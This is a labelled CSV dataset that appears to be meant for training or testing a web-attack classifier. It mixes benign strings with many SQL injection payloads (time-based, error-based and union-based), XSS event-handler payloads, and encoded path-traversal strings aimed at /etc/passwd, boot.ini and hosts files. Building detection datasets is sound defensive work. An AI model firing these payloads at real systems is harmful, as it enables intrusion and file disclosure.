"payload","label"
"-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh","SQLi"
"7 billion years ago , cosmos created Big Bang","Normal"
"1   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  4234  =  4234","SQLi"
"1'|| ( select 'ersu' where 4123 = 4123 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","SQLi"
"../../../../../windows/system32/drivers/etc/hosts%00index.htm","Suspicious"
"1 )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( 3326 = 3326","SQLi"
"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SQLi"
"/usr/etc/pure-ftpd.conf","Suspicious"
"%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215boot.ini","Suspicious"
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a><sup class=""noprint Inline-Template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citing_sources"" title=""Wikipedia:Citing sources""><span title=""This citation requires a reference to the specific page or range of pages in which the material appears. (February 2011)"">page&#160;needed","Normal"
"%25c0%25ae%25c0%25ae%c1%pc%25c0%25ae%25c0%25ae%c1%pc%25c0%25ae%25c0%25ae%c1%pc%25c0%25ae%25c0%25ae%c1%pc%25c0%25ae%25c0%25ae%c1%pc%25c0%25ae%25c0%25ae%c1%pcetc%c1%pcissue","Suspicious"
"<style>:target {color:red;}</style><isindex id=x style=""transition:color 1s"" ontransitionend=alert(1)></isindex>","XSS"
"INSERT INTO base ( wind, view, eat, characteristic, fell, familiar )  VALUES  ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )","Normal"
"%2e./%2e./%2e./%2e./etc/passwd","Suspicious"
"33600","Normal"
"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>","XSS"
"///../../../../etc///issue","Suspicious"
"<footer draggable=""true"" ondragstart=""alert(1)"">test</footer>","XSS"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1cboot.ini","Suspicious"
"austriaca","Normal"
"macular","Normal"
"or sleep  (  __TIME__  )    =  '","SQLi"
"or 'something'   =   'some'+'thing'","SQLi"
"<bgsound onpointerup=alert(1)>XSS</bgsound>","XSS"
"..%01%c1%8setc%c1%8sissue","Suspicious"
"5886675578398805","Normal"
"iif  (  9134  =  5736,1,1/0  )","SQLi"
"%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63etc%%35%%63issue","Suspicious"
"UPDATE instant SET slowly = 'sometime'WHERE positive = 'care'","Normal"
"%c0%ae%c0%ae%uEFC8%c0%ae%c0%ae%uEFC8%c0%ae%c0%ae%uEFC8etc%uEFC8passwd","Suspicious"
"villanueva de la serena","Normal"
"%2e.%e0%80%af%2e.%e0%80%af%2e.%e0%80%afetc%e0%80%afpasswd","Suspicious"
"SELECT waste ( s )  FROM direct SELECT putting ( s )","Normal"
"%f0%80%80%ae%f0%80%80%ae%25c1%259c%f0%80%80%ae%f0%80%80%ae%25c1%259c%f0%80%80%ae%f0%80%80%ae%25c1%259c%f0%80%80%ae%f0%80%80%ae%25c1%259cetc%25c1%259cissue","Suspicious"
"/etc/hosts.equiv","Suspicious"
"?.%uEFC8?.%uEFC8?.%uEFC8boot.ini","Suspicious"
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>","XSS"
"..../%uF025..../%uF025..../%uF025..../%uF025..../%uF025..../%uF025windows%uF025system32%uF025drivers%uF025etc%uF025hosts","Suspicious"
"43134733g","Normal"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5940 )  ORDER BY meta_id ASC","Normal"
"1 union all select null,null--","SQLi"
"rumsey@ubikuo.coop","Normal"
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>","XSS"
"SELECT AVG ( shape ) FROM man SELECT SUM ( jump )","Normal"
"select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1","SQLi"
"1"" )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""udlh"" = ""udlh","SQLi"
")   or   (  'x'  )    =    (  'x","SQLi"
".?%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts","Suspicious"
"..%01%f8%80%80%80%af..%01%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '","SQLi"
"%%c0%6e%c0%6e%c1%8setc%c1%8sissue","Suspicious"
"<output onpointermove=alert(1)>XSS</output>","XSS"
"%c0.%c0.%c1%af%c0.%c0.%c1%af%c0.%c0.%c1%af%c0.%c0.%c1%afetc%c1%afissue","Suspicious"
"<li><cite id=""CITEREFPoliLangdonMcPhee2008"" class=""citation book"">Poli, R.; Langdon, W. B.; McPhee, N. F. (2008). <a rel=""nofollow"" class=""external text"" href=""http://www.gp-field-guide.org.uk/""><i>A Field Guide to Genetic Programming </i> </a>. Lulu.com. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-4092-0073-4"" title=""Special:BookSources/978-1-4092-0073-4""><bdi>978-1-4092-0073-4 </bdi> </a> &#8211; via gp-field-guide.org.uk. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=A+Field+Guide+to+Genetic+Programming&amp;rft.pub=Lulu.com&amp;rft.date=2008&amp;rft.isbn=978-1-4092-0073-4&amp;rft.aulast=Poli&amp;rft.aufirst=R.&amp;rft.au=Langdon%2C+W.+B.&amp;rft.au=McPhee%2C+N.+F.&amp;rft_id=http%3A%2F%2Fwww.gp-field-guide.org.uk%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">","Normal"
"calle capitan salas 97,","Normal"
"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap","SQLi"
"/../../../../../../../../../../../boot.ini%00.jpg","Suspicious"
"%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63%c0%ee%c0%ee%%35%%63etc%%35%%63passwd","Suspicious"
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SQLi"
"SELECT COUNT ( perfect ) FROM captain","Normal"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></option>","XSS"
"SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY","Normal"
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>","XSS"
"walmsley@custombikesclothes.gd","Normal"
"SELECT guide, troops, condition FROM crew WHERE piece  IS NULL","Normal"
"%c0%fe%c0%fe%%32%%66%c0%fe%c0%fe%%32%%66%c0%fe%c0%fe%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts","Suspicious"
"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini","Suspicious"
"select  ( case when  ( 7978 = 6009 )  then 7978 else 1/ ( select 0 )  end ) --","SQLi"
"4857","Normal"
"%5C..%c1%1c%5C..%c1%1c%5C..%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"%c0%fe%c0%fe%c0%5c%c0%fe%c0%fe%c0%5c%c0%fe%c0%fe%c0%5c%c0%fe%c0%fe%c0%5c%c0%fe%c0%fe%c0%5c%c0%fe%c0%fe%c0%5cetc%c0%5cissue","Suspicious"
"org/]VIAGRA TABS[/url] http://RockVideoGames","Normal"
"%2e.%uF025boot.ini","Suspicious"
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""hbfr"" like ""hbfr","SQLi"
"stephany","Normal"
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy","SQLi"
".%2e0x5c.%2e0x5c.%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"-5362 )  union all select 7297,7297,7297,7297,7297#","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts","Suspicious"
"1' where 6135 = 6135","SQLi"
"%f0%80%80%ae%f0%80%80%ae%e0%80%af%f0%80%80%ae%f0%80%80%ae%e0%80%af%f0%80%80%ae%f0%80%80%ae%e0%80%af%f0%80%80%ae%f0%80%80%ae%e0%80%af%f0%80%80%ae%f0%80%80%ae%e0%80%af%f0%80%80%ae%f0%80%80%ae%e0%80%afetc%e0%80%afpasswd","Suspicious"
".%2e%25c1%259c.%2e%25c1%259c.%2e%25c1%259c.%2e%25c1%259c.%2e%25c1%259c.%2e%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts","Suspicious"
"(2005) uses conditional random fields","Normal"
"<map onbeforecopy=""alert(1)"" contenteditable>test</map>","XSS"
"1' and sleep ( 5 )  and 'pfgy' = 'pfgy","SQLi"
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu","SQLi"
".%00.%bg%qf.%00.%bg%qf.%00.%bg%qf.%00.%bg%qfetc%bg%qfpasswd","Suspicious"
"-2233' or  ( 1807 = 7274 ) *7274","SQLi"
"In October , GM sold 42,660 Silverado 16,503 Sierra pickup trucks","Normal"
"SELECT TOP 3 * FROM perhaps WHERE coming = 'telephone' SELECT * FROM nearest","Normal"
"select case when 7717 = 7717 then 1 else null end--","SQLi"
"%c0%fe%c0%fe%2f%c0%fe%c0%fe%2f%c0%fe%c0%fe%2f%c0%fe%c0%fe%2f%c0%fe%c0%fe%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts","Suspicious"
"SELECT * FROM slept WHERE former BETWEEN '1996-07-01' AND '1996-07-31'","Normal"
"..../%uEFC8etc%uEFC8issue","Suspicious"
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;462–644, </li>","Normal"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></progress>","XSS"
"Renamo wanted &quot; warn international community things going well Mozambique , &quot; Mr Mazanga said","Normal"
"<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>","XSS"
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>","XSS"
"%c0.%c0.0x2f%c0.%c0.0x2fetc0x2fissue","Suspicious"
"1' )  as xagu where 9088 = 9088  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --","SQLi"
"<div class=""thumbcaption"">","Normal"
"%c0%ae%c0%ae%252f%c0%ae%c0%ae%252f%c0%ae%c0%ae%252f%c0%ae%c0%ae%252f%c0%ae%c0%ae%252f%c0%ae%c0%ae%252fetc%252fissue","Suspicious"
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #","SQLi"
"%c0%2e%c0%2e0x2fboot.ini","Suspicious"
"pifarre marola","Normal"
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%"" = ""","SQLi"
"120958000000000","Normal"
"<tr onpointerout=alert(1)>XSS</tr>","XSS"
"1%"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  ""","SQLi"
"/var/log/news","Suspicious"
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>","XSS"
"SELECT * FROM split ORDER BY various, shoulder","Normal"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( ""mofa"" like ""mofa","SQLi"
"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=54"" title=""Edit section: Decrease in demand for human labor"">edit </a><span class=""mw-editsection-bracket"">]","Normal"
"<map id=x tabindex=1 onbeforeactivate=alert(1)></map>","XSS"
"%c0.%c0.%uEFC8%c0.%c0.%uEFC8%c0.%c0.%uEFC8%c0.%c0.%uEFC8boot.ini","Suspicious"
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz","SQLi"
"pundyk","Normal"
"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log","Suspicious"
"%2e.%c0%5cboot.ini","Suspicious"
"0x2e0x2e%c1%9c0x2e0x2e%c1%9cetc%c1%9cpasswd","Suspicious"
"<isindex ondblclick=""alert(1)"">test</isindex>","XSS"
"%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%af%c0%ee%c0%ee%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"<blockquote onmouseover=""alert(1)"">test</blockquote>","XSS"
"iif  (  9007  =  3836,1,1/0  )","SQLi"
"He thwarted police &apos;s investigation much possible enable continue criminal activities","Normal"
"c/ cabo alomar blanes 122 10?b","Normal"
"<rtc onpointerenter=alert(1)>XSS</rtc>","XSS"
"%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\etc\passwd","Suspicious"
"-1432""  )  )   union all select 9008,9008,9008#","SQLi"
"?.%c1%8s?.%c1%8setc%c1%8sissue","Suspicious"
"<button oncut=""alert(1)"" contenteditable>test</button>","XSS"
"<IMG """"""><SCRIPT>alert("""")</SCRIPT>""\>","XSS"
"carrer felix cucurull, 167 3-a","Normal"
"-8065""  )  )   )  order by 1--","SQLi"
"pinilla del valle","Normal"
"1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa","SQLi"
"SELECT TOP 3 * FROM engineer WHERE attached = 'circus' SELECT * FROM contain","Normal"
"<shadow draggable=""true"" ondragend=""alert(1)"">test</shadow>","XSS"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x2fetc0x2fpasswd","Suspicious"
"argujillo","Normal"
"%uff0e%uff0e0x2f%uff0e%uff0e0x2f%uff0e%uff0e0x2f%uff0e%uff0e0x2f%uff0e%uff0e0x2fetc0x2fpasswd","Suspicious"
"%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%afetc%c1%afpasswd","Suspicious"
"15691","Normal"
"1  )   and 3861  =  5813--","SQLi"
"admin"" or ""1"" = ""1""--","SQLi"
"-6081 where 3681 = 3681 or 2603 = 3138--","SQLi"
"0852672704954562","Normal"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qf%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%qfetc%c0%qfissue","Suspicious"
"<div onmouseleave=""alert(1)"">test</div>","XSS"
"%c0%fe%c0%fe%c1%8s%c0%fe%c0%fe%c1%8s%c0%fe%c0%fe%c1%8setc%c1%8sissue","Suspicious"
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>","XSS"
"-1339  )  )   )  union all select 2938,2938,2938,2938,2938,2938#","SQLi"
"1 where 7464 = 7464 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --","SQLi"
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'","SQLi"
"91220241x","Normal"
"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#","SQLi"
"%%c0%6e%c0%6e%e0%80%af%%c0%6e%c0%6e%e0%80%af%%c0%6e%c0%6e%e0%80%af%%c0%6e%c0%6e%e0%80%af%%c0%6e%c0%6e%e0%80%afetc%e0%80%afpasswd","Suspicious"
"if  (  6647  =  2179  )   select 6647 else drop function zvlq--","SQLi"
"1'|| ( select 'nbmo' from dual where 5572 = 5572 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --","SQLi"
"<tr onpaste=""alert(1)"" contenteditable>test</tr>","XSS"
"%f8%80%80%80%ae%f8%80%80%80%ae%5c%f8%80%80%80%ae%f8%80%80%80%ae%5c%f8%80%80%80%ae%f8%80%80%80%ae%5c%f8%80%80%80%ae%f8%80%80%80%ae%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","Suspicious"
"7613","Normal"
"8033","Normal"
"%c0%fe%c0%fe%2f%c0%fe%c0%fe%2fetc%2fpasswd","Suspicious"
"<audio onpointerleave=alert(1)>XSS</audio>","XSS"
"-8753 )  order by 1#","SQLi"
"1'+  (  select mkbv where 1648  =  1648 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SQLi"
"INSERT INTO six  ( solid, automobile, wore )  VALUES  ( 'hope', 'leather', 'smallest' )","Normal"
"%%c0%6e%c0%6e%c1%9cboot.ini","Suspicious"
"<menuitem ondblclick=""alert(1)"">test</menuitem>","XSS"
"samm@lawn.sn","Normal"
"%%c0%6e%c0%6e%%35%%63%%c0%6e%c0%6e%%35%%63%%c0%6e%c0%6e%%35%%63%%c0%6e%c0%6e%%35%%63%%c0%6e%c0%6e%%35%%63boot.ini","Suspicious"
"diogenes 82,","Normal"
"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --","SQLi"
"China plea paper &apos; overhauled &apos; A Chinese newspaper made front-page appeal release reporter accused defamation overhauled , press regulator says","Normal"
"-7903 where 6699 = 6699 or 8571 = 8571--","SQLi"
"%e0%80%ae%e0%80%ae%25c0%25afetc%25c0%25afissue","Suspicious"
"<noscript onkeypress=""alert(1)"" contenteditable>test</noscript>","XSS"
"%25c0%25ae%25c0%25ae0x2f%25c0%25ae%25c0%25ae0x2f%25c0%25ae%25c0%25ae0x2fetc0x2fissue","Suspicious"
"-3475"" or elt ( 5532 = 4242,4242 )","SQLi"
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" ontransitionend=alert(1)></footer>","XSS"
"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#","SQLi"
"nolay","Normal"
"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms","SQLi"
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--","SQLi"
"09312","Normal"
"SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally","Normal"
"..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd","Suspicious"
".?0x5cetc0x5cissue","Suspicious"
"<svg><param onload=alert(1)></param>","XSS"
"-4546' )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )","SQLi"
".%00.%e0%80%af.%00.%e0%80%af.%00.%e0%80%afetc%e0%80%afissue","Suspicious"
"%c0%2e%c0%2e%c1%8s%c0%2e%c0%2e%c1%8sboot.ini","Suspicious"
"<embed id=x tabindex=1 onactivate=alert(1)></embed>","XSS"
"SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL","Normal"
".?%bg%qf.?%bg%qf.?%bg%qfetc%bg%qfpasswd","Suspicious"
"0"" encoding  =  ""utf-8"" ?>   <_filter>  <![CDATA[insert]]>  </_filter>   <_filter>  <![CDATA[signup]]>  </_filter>   <_filter>  <![CDATA[widget_login]]>  </_filter>   <a href  =  ""http://caritaskinshasa","Normal"
"<a oncopy=""alert(1)"" contenteditable>test</a>","XSS"
"%c0%ee%c0%ee%c0%qf%c0%ee%c0%ee%c0%qf%c0%ee%c0%ee%c0%qfboot.ini","Suspicious"
"But devices testing appeal highway planners &apos;t use GPS deliver limited amount information , uploaded periodically modem","Normal"
"<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>","XSS"
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )","SQLi"
"%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9cboot.ini","Suspicious"
"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc%c0%5cissue","Suspicious"
"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--","SQLi"
"select * from users where id = 1 %!<@ or 1 = 1 -- 1","SQLi"
"<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>","XSS"
"hrenyk","Normal"
"select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1","SQLi"
"pintipara8a","Normal"
"%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9c%f0%80%80%ae%f0%80%80%ae%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"<thead onpointerout=alert(1)>XSS</thead>","XSS"
"select pg_sleep  (  5  )   and   (  '%'  =  '","SQLi"
"SELECT * FROM voyage FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wheel","Normal"
"%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/issue","Suspicious"
"arruga4","Normal"
"<basefont onpointerup=alert(1)>XSS</basefont>","XSS"
"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --","SQLi"
"24175","Normal"
"1'+  (  select 'qmtx' where 6992  =  6992 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SQLi"
"SELECT * FROM fix WHERE include = 'environment'  OR industrial = 'wise'","Normal"
"SELECT * FROM butter WHERE within BETWEEN not09/01/1996border AND birds15/31/1996vertical","Normal"
"<option onpointerup=alert(1)>XSS</option>","XSS"
"<head onmouseleave=""alert(1)"">test</head>","XSS"
"%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts","Suspicious"
"p81i4uer3o","Normal"
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl","SQLi"
"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5  )  )   ) +'","SQLi"
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>","XSS"
"<style>:target {transform: rotate(180deg);}</style><em id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></em>","XSS"
"%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fissue","Suspicious"
"-9191' )  as qtvm where 2838 = 2838 or  ( 8459 = 8459 ) *4906--","SQLi"
"C:/php/sessions/","Suspicious"
"3823811440410539","Normal"
"??%c1%1c??%c1%1c??%c1%1c??%c1%1c??%c1%1c??%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
